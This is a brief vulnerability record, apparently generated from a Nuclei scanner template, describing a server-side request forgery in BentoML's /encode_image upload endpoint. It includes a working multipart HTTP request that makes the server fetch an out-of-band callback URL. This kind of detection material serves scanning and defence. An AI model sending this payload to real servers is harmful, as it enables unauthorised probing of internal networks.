# Vulnerability: Bentoml - Server Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`bentoml-ssrf.yaml`)

## Description
BentoML's upload file request is vulnerable to SSRF that allowing attacker to access internal service (local network).

## Vulnerable Code Pattern / Exploit Payload
```http
POST /encode_image HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqThdiCjrkRXHqIr

------WebKitFormBoundaryGqThdiCjrkRXHqIr
Content-Disposition: form-data; name="items";

http://{{interactsh-url}}/{{rand}}
------WebKitFormBoundaryGqThdiCjrkRXHqIr--
```

